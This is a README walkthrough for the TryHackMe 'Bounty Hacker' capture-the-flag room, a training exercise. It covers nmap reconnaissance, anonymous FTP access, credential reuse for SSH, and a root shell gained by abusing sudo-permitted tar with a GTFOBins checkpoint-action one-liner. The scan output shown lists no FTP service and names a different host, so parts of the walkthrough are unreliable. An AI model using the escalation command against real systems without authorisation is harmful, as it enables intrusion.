# Bounty Hacker 🚀

![BountyHacker](bount.jpeg)

## Overview

The "Bounty Hacker" project is a simulated cybersecurity challenge designed to test and improve your penetration testing skills. Participants are tasked with proving their mettle as the most elite hacker in the solar system by overcoming a series of tasks. The scenario involves a hacker boasting about their skills in a bar, leading to a challenge by a group of Bounty Hunters to prove these claims. The challenge encompasses various stages, including reconnaissance, exploitation, and privilege escalation.

### Setting Up the Environment

1. **Connect to the THM (TryHackMe) VPN** to access the challenge environment.
   ```bash
   sudo openvpn yourvpnconfig.ovpn
   ```
2. **Verify the VPN connection** is established to ensure access to the challenge network.

## Usage Guide

### Task 1: Reconnaissance

Start by deploying the machine and performing network scanning to discover open ports and services. This can be achieved using Nmap:
```bash
nmap -sC -sV -Pn <machine-ip>
```
- `-sC`: Runs a script scan using the default set of scripts.
- `-sV`: Probes open ports to determine service/version info.
- `-Pn`: Treats all hosts as online -- useful for scanning through VPN.

```bash
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
    |   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
    |_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
    80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
    | ajp-methods: 
    |_  Supported methods: GET HEAD POST OPTIONS
    8080/tcp open  http        Apache Tomcat 9.0.7
    |_http-title: Apache Tomcat/9.0.7
    |_http-favicon: Apache Tomcat
    Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Task 2: Gaining Access

1. **Identify services and vulnerabilities** based on the Nmap scan results. Typically, you'll find services like SSH and FTP open.
2. **Explore the FTP service** using an anonymous login to retrieve any accessible files. This often involves finding user names or potential password files.
   ```bash
        ftp <machine-ip>
   ```
   Use `anonymous` as the username.
3. **Use the discovered credentials** to access other services, such as SSH, to gain a user shell on the machine.

### Task 3: Privilege Escalation

1. **Enumerate the system** for misconfigurations or exploitable conditions. Tools like `sudo -l` can reveal commands the user can run with superuser privileges.

```bash
    User may run the following commands on this host:
        (root) /bin/tar
```

2. **Exploit these conditions** to gain elevated privileges. 

This permission allows us to execute `tar` with root privileges, presenting a pathway to escape restricted environments or enhance our privilege level.

A technique found on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) demonstrates how `tar` can be exploited to spawn a shell with elevated privileges. GTFOBins is a valuable resource that collects snippets exploiting the binaries to bypass local security restrictions.

#### The Command

To exploit this, we use the following command:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### Breakdown

- `sudo tar` invokes `tar` with superuser privileges.
- `-cf /dev/null /dev/null` specifies creating an archive with no files, effectively doing nothing, which serves as a pretext to use other options.
- `--checkpoint=1` sets a checkpoint after every file processed. Since no files are being archived, this checkpoint triggers immediately.
- `--checkpoint-action=exec=/bin/sh` executes a shell (`/bin/sh`) when the checkpoint is reached.

## Conclusion

This README provides a structured and comprehensive guide to the `"Bounty Hacker"` project, ensuring that participants have a clear understanding of the objectives, the steps required to complete the challenge, and how to contribute to the project.